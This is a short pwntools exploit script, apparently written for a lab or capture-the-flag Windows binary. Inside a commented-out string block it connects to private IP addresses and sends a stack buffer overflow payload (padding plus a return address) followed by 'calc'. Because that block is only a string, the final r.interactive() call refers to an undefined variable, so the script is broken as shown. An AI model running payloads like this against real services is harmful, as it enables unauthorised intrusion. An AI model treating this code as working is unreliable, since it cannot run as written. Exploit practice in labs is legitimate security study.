from pwn import *
from time import sleep

context.log_level = 'debug'

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')
'''
#r = remote('10.211.55.3', 1234)
r = remote('192.168.10.101', 2233)

p1 = b'a' * (0x14 + 4)
p1 += p32(0x401000)
r.sendline(p1)
sleep(1)
r.sendline('calc')

'''
context.os='windows'

import os



r.interactive()
